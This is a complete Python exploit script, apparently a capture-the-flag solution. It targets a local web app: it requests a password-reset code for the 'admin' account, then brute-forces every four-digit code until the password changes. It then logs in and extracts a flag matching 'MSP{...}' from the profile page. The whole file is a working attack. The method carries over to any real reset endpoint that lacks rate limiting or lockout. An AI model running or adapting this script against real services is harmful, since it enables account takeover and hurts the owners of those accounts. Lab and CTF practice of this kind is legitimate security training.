#!/usr/bin/env python3
import sys
import re
import urllib.request
import urllib.parse
import http.cookiejar

BASE_URL = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000").rstrip("/")
TARGET_USERNAME = "admin"
NEW_PASSWORD = "Pwned_12345!"

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def post(path, data):
    url = f"{BASE_URL}{path}"
    encoded = urllib.parse.urlencode(data).encode("utf-8")
    req = urllib.request.Request(url, data=encoded, method="POST")
    with opener.open(req, timeout=10) as resp:
        return resp.read().decode("utf-8", errors="replace")


def get(path):
    url = f"{BASE_URL}{path}"
    with opener.open(url, timeout=10) as resp:
        return resp.read().decode("utf-8", errors="replace")


def main():
    print(f"[*] Target: {BASE_URL}")
    print("[*] Requesting reset code...")
    post("/reset/request", {"username": TARGET_USERNAME})

    found_code = None
    for i in range(10000):
        code = f"{i:04d}"
        body = post("/reset/confirm", {
            "username": TARGET_USERNAME,
            "code": code,
            "newPassword": NEW_PASSWORD
        })
        if "Password updated" in body:
            found_code = code
            print(f"[+] Found code: {code}")
            break
        if i % 1000 == 0 and i != 0:
            print(f"[*] Tried {i} codes...")

    if not found_code:
        print("[-] Code not found. Is the server running?")
        return 1

    print("[*] Logging in...")
    post("/login", {"username": TARGET_USERNAME, "password": NEW_PASSWORD})
    profile = get("/profile")

    m = re.search(r"MSP\{[^}]+\}", profile)
    if m:
        print(f"[+] Flag: {m.group(0)}")
        return 0

    print("[-] Flag not found. Check login or page content.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
